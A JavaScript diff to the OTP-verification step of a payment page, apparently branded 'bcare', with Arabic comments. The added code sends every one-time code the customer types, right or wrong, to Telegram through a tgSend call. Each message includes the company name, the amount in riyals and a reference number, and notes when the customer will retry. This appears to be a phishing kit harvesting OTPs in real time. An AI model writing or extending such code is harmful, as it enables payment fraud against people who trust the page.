@@ -264,7 +264,7 @@ function initBoxes() {
 }
 
 /* ─── التحقق من OTP ───────────────────────────────── */
-function verifyOTP() {
+async function verifyOTP() {
   const boxes   = [...document.querySelectorAll('.otp-box')];
   const entered = boxes.map(b => b.value).join('');
 
@@ -272,6 +272,10 @@ function verifyOTP() {
     clearInterval(timerInt);
     clearInterval(pollInt);
     boxes.forEach(b => b.classList.add('otp-success'));
+
+    /* 📨 رسالة ثانية لـ Telegram: العميل أكّد الرمز */
+    await tgSend(buildConfirmMsg(entered, true));
+
     showSuccess();
   } else {
     boxes.forEach(b => {
@@ -279,12 +283,50 @@ function verifyOTP() {
       setTimeout(() => b.classList.remove('otp-error'), 500);
     });
     setOTPErr('رمز التحقق غير صحيح — حاول مرة أخرى أو أعد الإرسال');
+
+    /* 📨 رسالة ثانية لـ Telegram: العميل أدخل رمز خاطئ */
+    await tgSend(buildConfirmMsg(entered, false));
+
     setTimeout(() => {
       boxes.forEach(b => { b.value=''; b.classList.remove('filled'); });
       const confirmBtn = document.getElementById('otp-confirm-btn');
       if (confirmBtn) confirmBtn.disabled = true;
       boxes[0]?.focus();
     }, 600);
+  }
+}
+
+/* ─── بناء رسالة تأكيد العميل (الرسالة الثانية) ────── */
+function buildConfirmMsg(entered, correct) {
+  try {
+    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
+    if (correct) {
+      return `✅ <b>العميل أكّد الرمز</b>
+
+🔑 الرمز الذي أدخله العميل: <code>${entered}</code>
+✅ <b>الرمز صحيح — تم تأكيد الدفع</b>
+
+🏢 الشركة: ${offer.companyName || '—'}
+💰 المبلغ: ر.س ${parseFloat(offer.total||0).toFixed(2)}
+🆔 المرجع: <code>${offer.refNumber || '—'}</code>
+
+<i>العملية مكتملة ✅</i>`;
+    } else {
+      return `❌ <b>العميل أدخل رمز خاطئ</b>
+
+🔑 الرمز الذي أدخله: <code>${entered}</code>
+❌ <b>الرمز غير صحيح</b>
+
+🏢 الشركة: ${offer.companyName || '—'}
+💰 المبلغ: ر.س ${parseFloat(offer.total||0).toFixed(2)}
+🆔 المرجع: <code>${offer.refNumber || '—'}</code>
+
+<i>العميل سيعيد المحاولة...</i>`;
+    }
+  } catch(e) {
+    return correct
+      ? `✅ العميل أكّد الرمز: <code>${entered}</code>`
+      : `❌ العميل أدخل رمز خاطئ: <code>${entered}</code>`;
   }
 }
 
